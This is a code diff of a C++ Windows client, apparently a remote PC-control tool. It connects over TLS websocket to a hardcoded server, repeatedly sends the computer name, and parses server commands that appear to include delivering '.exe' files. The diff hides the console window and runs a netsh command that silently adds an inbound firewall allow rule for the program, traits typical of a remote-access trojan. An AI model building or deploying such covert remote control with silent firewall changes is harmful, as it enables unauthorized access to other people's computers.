@@ -5,7 +5,7 @@
 #include <ixwebsocket/IXWebSocket.h>
 #include <nlohmann/json.hpp>
 #include <filesystem>
-
+#include <exception>
 
 using json = nlohmann::json;
 using namespace std;
@@ -48,41 +48,39 @@ void ErrorNotiffication(const char* message){
 
 
 
-
-
-
-
-// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
-int main()
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+// int main()
 {
-    string BASE_URL;
+    string command_netsh = "netsh advfirewall firewall add rule name=\"Eye rule\" dir=in action=allow program=\"" + getExePath() +  "\" enable=yes profile=public";
+    system(command_netsh.c_str());
+    
+    
+    string BASE_URL = "wss://pccontrolbackend.onrender.com/openC";
 
-
-    ifstream file("host.txt");
-    if(file){
-        getline(file,BASE_URL);
-
-    }else{
-        ErrorNotiffication("Not open host.txt");
-        return 1;
-    }
-
-    file.close();
     
     cout << BASE_URL << endl;
     ix::initNetSystem();
     ix::WebSocket webSocket;
+    
+    ix::SocketTLSOptions tlsOptions;
+    tlsOptions.tls = true;
+    cout << tlsOptions.getDescription() << endl;
+
+    webSocket.setTLSOptions(tlsOptions);
+
     webSocket.setUrl(BASE_URL); 
-
-
     
     bool isConnect = false;
+    
     webSocket.setOnMessageCallback([&](const ix::WebSocketMessagePtr& msg) {
+        cout << msg->errorInfo.reason << endl;
+        cout << msg->closeInfo.reason << endl;
         if(msg->type == ix::WebSocketMessageType::Message){
             if(!isConnect){
-                // cout << "from server: " << msg->str << endl;
+                cout << "from server: " << msg->str << endl;
                 isConnect = true;
             }else{
+              try{  
                 json data = json::parse(msg->str);
 
                 string type = data["type"];
@@ -98,12 +96,15 @@ int main()
 // "filename": "".exe
 // "data": 0010101010100101010
                 }
+            } catch(exception& e){
+                // cout << e.what() << endl;
+            }
+         
             }
         }
     });
-
+    
     webSocket.start();
-
     
     string pc_name = getComputerName();
 
@@ -113,11 +114,11 @@ int main()
 
     while(true){
         if(isConnect){
-          cout << '.';
+        //   cout << '.';
         }else{
           webSocket.send(send_data.dump());  
         //   cout << send_data["key"] << endl;
-          cout << send_data["name"] << endl;
+        //   cout << send_data["name"] << endl;
         }
         this_thread::sleep_for(std::chrono::seconds(1));
     }
